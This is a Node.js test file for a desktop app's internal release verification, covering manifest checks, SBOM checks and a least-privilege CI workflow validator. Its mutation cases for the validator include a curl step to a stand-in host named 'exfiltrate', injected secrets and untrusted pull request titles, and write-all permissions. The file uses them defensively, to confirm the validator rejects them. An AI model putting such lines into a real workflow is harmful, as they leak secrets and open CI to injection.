import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { join } from "node:path";
import test from "node:test";

import {
  internalArtifactName,
  releaseManifestFailures,
  spdxFailures,
} from "./release-contract.mjs";
import { internalReleaseWorkflowFailures } from "./internal-release-workflow.mjs";

const revision = "a".repeat(40);
const digest = "b".repeat(64);
const sourceEpoch = 1_700_000_000;
const inputEvidence = {
  cargoLockSha256: "1".repeat(64),
  frontendLockSha256: "2".repeat(64),
  policySha256: "3".repeat(64),
  rootLockSha256: "4".repeat(64),
};

function manifest() {
  return {
    schema: "keiko-native-internal-release/v1",
    channel: "internal",
    applicationIdentifier: "dev.oscharko.keiko-native",
    version: "0.1.0",
    architecture: "arm64",
    sourceRevision: revision,
    sourceEpoch,
    artifact: {
      name: "Keiko-Native-0.1.0-internal-arm64.dmg",
      sha256: digest,
      size: 1024,
    },
    payloadInventory: [
      {
        mode: "0644",
        path: "Contents/Info.plist",
        sha256: "d".repeat(64),
        size: 128,
      },
      {
        mode: "0755",
        path: "Contents/MacOS/keiko-native-desktop",
        sha256: "c".repeat(64),
        size: 512,
      },
      {
        mode: "0644",
        path: "Contents/Resources/THIRD-PARTY-NOTICES.json",
        sha256: "e".repeat(64),
        size: 256,
      },
    ],
    evidence: {
      digest: "SHA256SUMS",
      inputs: inputEvidence,
      packageManifest: "package-manifest.json",
      sbom: "sbom.spdx.json",
    },
    toolchains: { node: "24.18.0", npm: "11.16.0", rust: "1.92.0" },
  };
}

test("internal release manifest binds one exact source and sorted payload", () => {
  const value = manifest();
  assert.equal(
    internalArtifactName(value.version, value.architecture),
    value.artifact.name,
  );
  assert.deepEqual(
    releaseManifestFailures(value, {
      digest,
      inputEvidence,
      revision,
      size: 1024,
      sourceEpoch,
    }),
    [],
  );
  for (const mutation of [
    { ...value, extra: true },
    { ...value, channel: "stable" },
    { ...value, sourceRevision: "bad" },
    { ...value, sourceEpoch: 0 },
    { ...value, sourceEpoch: value.sourceEpoch + 1 },
    { ...value, architecture: "x64" },
    { ...value, artifact: { ...value.artifact, name: "public.dmg" } },
    { ...value, artifact: { ...value.artifact, sha256: "0".repeat(64) } },
    {
      ...value,
      payloadInventory: [...value.payloadInventory, value.payloadInventory[0]],
    },
  ]) {
    assert.ok(
      releaseManifestFailures(mutation, {
        digest,
        inputEvidence,
        revision,
        size: 1024,
        sourceEpoch,
      }).length > 0,
    );
  }
});

test("SPDX 2.3 evidence is deterministic and binds the DMG checksum", () => {
  const sbom = {
    spdxVersion: "SPDX-2.3",
    dataLicense: "CC0-1.0",
    SPDXID: "SPDXRef-DOCUMENT",
    name: `keiko-native-internal-${revision}`,
    documentNamespace: `https://github.com/oscharko-dev/Keiko-Native/sbom/${revision}/${digest}`,
    creationInfo: {
      created: "2023-11-14T22:13:20.000Z",
      creators: ["Tool: keiko-native-release-verify/1"],
    },
    packages: [
      {
        SPDXID: "SPDXRef-Package-1",
        name: "cargo_metadata",
        versionInfo: "0.19.2",
        downloadLocation: "NOASSERTION",
        filesAnalyzed: false,
        licenseConcluded: "Apache-2.0",
        licenseDeclared: "Apache-2.0",
      },
      {
        SPDXID: "SPDXRef-Package-2",
        name: "cargo_toml",
        versionInfo: "0.22.3",
        downloadLocation: "NOASSERTION",
        filesAnalyzed: false,
        licenseConcluded: "Apache-2.0",
        licenseDeclared: "Apache-2.0",
      },
      {
        SPDXID: "SPDXRef-Package-3",
        name: "cargo-platform",
        versionInfo: "0.1.9",
        downloadLocation: "NOASSERTION",
        filesAnalyzed: false,
        licenseConcluded: "Apache-2.0",
        licenseDeclared: "Apache-2.0",
      },
    ],
    files: [
      {
        SPDXID: "SPDXRef-Internal-DMG",
        fileName: "Keiko-Native-0.1.0-internal-arm64.dmg",
        checksums: [{ algorithm: "SHA256", checksumValue: digest }],
      },
    ],
    relationships: [
      {
        spdxElementId: "SPDXRef-DOCUMENT",
        relationshipType: "DESCRIBES",
        relatedSpdxElement: "SPDXRef-Internal-DMG",
      },
    ],
  };
  assert.deepEqual(
    spdxFailures(sbom, {
      dependencies: sbom.packages.map(
        ({ licenseDeclared, name, versionInfo }) => ({
          license: licenseDeclared,
          name,
          version: versionInfo,
        }),
      ),
      digest,
      revision,
      sourceEpoch: 1_700_000_000,
    }),
    [],
  );
  for (const mutation of [
    { ...sbom, spdxVersion: "SPDX-2.2" },
    { ...sbom, extra: true },
    { ...sbom, files: [] },
    { ...sbom, packages: [] },
    {
      ...sbom,
      packages: [{ ...sbom.packages[0], future: true }],
    },
    {
      ...sbom,
      creationInfo: { ...sbom.creationInfo, created: new Date().toISOString() },
    },
  ]) {
    assert.ok(
      spdxFailures(mutation, {
        dependencies: sbom.packages.map(
          ({ licenseDeclared, name, versionInfo }) => ({
            license: licenseDeclared,
            name,
            version: versionInfo,
          }),
        ),
        digest,
        revision,
        sourceEpoch: 1_700_000_000,
      }).length > 0,
    );
  }
});

test("internal release workflow is least-privileged and publication-closed", async () => {
  const path = join(
    import.meta.dirname,
    "../.github/workflows/internal-release.yml",
  );
  const workflow = (await readFile(path, "utf8")).replaceAll("\r\n", "\n");
  assert.match(
    workflow,
    /env:\n          RELEASE_REVISION: \$\{\{ needs\.build\.outputs\.revision \}\}[\s\S]*--expected-head "\$RELEASE_REVISION"/u,
  );
  assert.doesNotMatch(workflow, /--expected-head \$\{\{/u);
  assert.deepEqual(internalReleaseWorkflowFailures(workflow), []);
  for (const mutation of [
    workflow.replace("retention-days: 14", "retention-days: 90"),
    workflow.replace("contents: read", "contents: write"),
    workflow.replace("runs-on: macos-14", "runs-on: macos-latest"),
    workflow.replace("runs-on: macos-26", "runs-on: macos-latest"),
    workflow.replace("npm run release:verify", "npm run native:package"),
    workflow.replace("epic/9-foundation-v0.1", "dev"),
    workflow.replace("actions/attest@", "actions/attest@v4 # "),
    workflow.replace(
      "permissions: {}",
      "permissions: write-all # permissions: {}",
    ),
    workflow.replace(
      "      id-token: write",
      "      id-token: write\n      issues: write # harmless-looking comment",
    ),
    workflow.replace("    timeout-minutes: 45", "    env: { BYPASS: 1 }"),
    workflow.replace(
      "          PULL_REQUEST_HEAD: ${{ github.event.pull_request.head.sha }}",
      "          PULL_REQUEST_HEAD: ${{ github.event.pull_request.head.sha }}\n          SECRET: ${{ secrets.RELEASE }}",
    ),
    workflow.replace(
      "      - run: npm run release:verify",
      "      - run: npm run release:verify\n        continue-on-error: true",
    ),
    workflow.replace("jobs:", '"jobs": &jobs'),
    `${workflow}\npush:\n`,
    `${workflow}\nenvironment: production\n`,
    `${workflow}\nrelease: write\n`,
    `${workflow}\npackages: write\n`,
    workflow.replace(
      "workflow_dispatch:",
      "workflow_dispatch:\n  schedule:\n    - cron: '0 0 * * *'",
    ),
    workflow.replace(
      "      - run: npm run release:verify",
      "      - run: npm run release:verify\n      - run: curl https://example.invalid/exfiltrate",
    ),
    workflow.replace(
      '--expected-head "$RELEASE_REVISION"',
      "--expected-head ${{ needs.build.outputs.revision }}",
    ),
    workflow.replace(
      "          RELEASE_REVISION: ${{ needs.build.outputs.revision }}\n        run: >-",
      "          RELEASE_REVISION: ${{ needs.build.outputs.revision }}\n          UNTRUSTED_INPUT: ${{ github.event.pull_request.title }}\n        run: >-",
    ),
  ]) {
    assert.ok(internalReleaseWorkflowFailures(mutation).length > 0);
  }
});
